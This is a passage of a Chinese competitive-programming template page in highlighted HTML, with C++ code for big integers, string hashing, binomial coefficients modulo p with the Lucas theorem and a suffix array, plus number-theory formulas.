class="token operator">-</span> b<span class="token operator">*</span>j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">+</span> b<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">!=</span> b<span class="token punctuation">.</span>len<span class="token punctuation">)</span> <span class="token keyword">return</span> len <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">&lt;=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">>=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">&lt;</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">!=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">&lt;</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    string <span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> s<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>istream<span class="token operator">&amp;</span> <span class="token keyword">operator</span> <span class="token operator">>></span> <span class="token punctuation">(</span>istream<span class="token operator">&amp;</span> in<span class="token punctuation">,</span> bign<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    in <span class="token operator">>></span> s<span class="token punctuation">;</span>    x <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> in<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>ostream<span class="token operator">&amp;</span> out<span class="token punctuation">,</span> <span class="token keyword">const</span> bign<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    out <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">.</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bign sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin <span class="token operator">>></span> t<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>len<span class="token operator">==</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>t<span class="token punctuation">.</span>d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        sum<span class="token operator">+=</span>t<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>sum<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="20-字符串哈希"><a href="#20-字符串哈希" class="headerlink" title="20. 字符串哈希"></a>20. 字符串哈希</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * 自然溢出字符串哈希 * 可用于字符串判重，或利用字符串单调性结合二分解决问题 */</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> ulint<span class="token punctuation">;</span><span class="token keyword">const</span> ulint seed <span class="token operator">=</span> <span class="token number">50009uLL</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">maxn</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">100010</span><span class="token punctuation">)</span></span></span>ulint xp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> H<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init_xp</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    xp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        xp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> xp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> seed<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init_hash</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    H<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        H<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> H<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> seed <span class="token operator">+</span> <span class="token punctuation">(</span>ulint<span class="token punctuation">)</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">ask_hash</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> H<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> H<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">-</span> H<span class="token punctuation">[</span>l<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> xp<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="21-数学公式"><a href="#21-数学公式" class="headerlink" title="21. 数学公式"></a>21. 数学公式</h3><h4 id="21-1-莫比乌斯反演"><a href="#21-1-莫比乌斯反演" class="headerlink" title="21.1 莫比乌斯反演"></a>21.1 莫比乌斯反演</h4><p><em>1</em>. 如果有$f(n)=\sum<em>{d\mid n}g(d)$, 则有 $g(n)=\sum</em>{d\mid n}{\mu(d)f(\frac{n}{d})}$</p><p><em>2</em>. $\sum_{d\mid n}{\mu(d)}=[n=1]$</p><p><em>3</em>. $\varphi(n)=\sum_{d\mid n}{\mu(d)\frac{d}{n}}$</p><h4 id="21-2-关于欧拉函数的一些公式"><a href="#21-2-关于欧拉函数的一些公式" class="headerlink" title="21.2 关于欧拉函数的一些公式"></a>21.2 关于欧拉函数的一些公式</h4><p><em>1</em>. $n=\sum_{d\mid n}\varphi(d)$</p><p><em>2</em>. $\sum_{i=1}^{n}{[gcd(i,n)=1]\cdot i}=\frac{n\cdot \varphi(n)+[n=1]}{2}$</p><p><em>3.</em> $\sum_{i=1}^{n}{gcd[i,j]}$</p><h4 id="21-3-组合数取模"><a href="#21-3-组合数取模" class="headerlink" title="21.3 组合数取模"></a>21.3 组合数取模</h4><p><em>1.</em>  $1\leq m\leq n\leq 1000$和$1\leq p\leq 10^9$的情况</p><p>​    使用预处理+取模即可。</p><p><em>2.</em> $1\leq m\leq n\leq 10^{18}$和$1\leq p\leq 10^9$的情况</p><p>使用Lucas定理，定理描述是，如果</p><p>$n = {n<em>k}p^k + n</em>{k-1}p^{k-1} + …. + {n<em>1}p + {n_0}$<br>$m = {m_k}p^k + {m</em>{k-1}}p^{k-1} + \cdots + {m_1}p + {m_0}$</p><p>那么得到 $C<em>{n}^{m} = \prod</em>{i=1}^{k}C_{n_i}^{m_i}\pmod p$</p><p>这样分别求，采用逆元计算。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">C</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ll a <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token operator">+</span>i<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span>  <span class="token comment">//逐项求解</span>        ll b <span class="token operator">=</span> i <span class="token operator">%</span> p<span class="token punctuation">;</span>        ans <span class="token operator">=</span> ans<span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token function">ksm</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//以下是在p在1e5之内的时候使用阶乘预处理</span><span class="token comment">//需要注意的是该预处理只对于相应的模数p生效</span><span class="token comment">//一般需要预处理的题目是要预处理多组阶乘</span><span class="token comment">//例如限制了p为素数或其他的时候可以使用</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>ll fac<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">facinit</span><span class="token punctuation">(</span>ll p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    fac<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> p<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    fac<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> fac<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>i<span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">C</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll m<span class="token punctuation">)</span>  <span class="token comment">//阶乘预处理之后的方法</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fac<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">*</span><span class="token function">inv</span><span class="token punctuation">(</span>fac<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">*</span>fac<span class="token punctuation">[</span>n<span class="token operator">-</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">Lucas</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll m<span class="token punctuation">)</span> <span class="token comment">//直接使用这个函数返回答案</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">C</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token punctuation">,</span>m<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">Lucas</span><span class="token punctuation">(</span>n<span class="token operator">/</span>p<span class="token punctuation">,</span>m<span class="token operator">/</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="22-后缀数组"><a href="#22-后缀数组" class="headerlink" title="22. 后缀数组"></a>22. 后缀数组</h3><p><em>1</em>.不同子串的数目: </p><p>$\sum<em>{i=0}^{n-1}{(n-p[i])}-\sum</em>{i=0}^{n-1}{lcp[i]}=\frac{n^2+n}{2}-\sum_{i=0}^{n-2}{lcp[i]}$</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * 后缀数组 * 后缀数组的倍增构造法 * 复杂度为O(nlogn) *  * 从 sa[i] 开始得后缀排在i个 * 从 i 开始得后缀排名为 rank[i] * height[i] 表示 sa[i-1] 和sa[i] 的最长公共前缀长度 */</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">1e6</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">[</span>a <span class="token operator">+</span> l<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b <span class="token operator">+</span> l<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> ta<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tb<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> bk<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">da</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>sa<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token operator">*</span>x <span class="token operator">=</span> ta<span class="token punctuation">,</span> <span class="token operator">*</span>y <span class="token operator">=</span> tb<span class="token punctuation">,</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> bk<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> sa<span class="token punctuation">[</span><span class="token operator">--</span>bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j <span class="token operator">&lt;&lt;=</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">=</span> p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> n <span class="token operator">-</span> j<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> j<span class="token punctuation">)</span> y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> bk<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> sa<span class="token punctuation">[</span><span class="token operator">--</span>bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>t <span class="token operator">=</span> x<span class="token punctuation">,</span> x <span class="token operator">=</span> y<span class="token punctuation">,</span> y <span class="token operator">=</span> t<span class="token punctuation">,</span> x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cmp</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">?</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> p<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">rank</span> <span class="token expression">rrank</span></span><span class="token keyword">int</span> rank<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calheight</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>sa<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        rank<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token 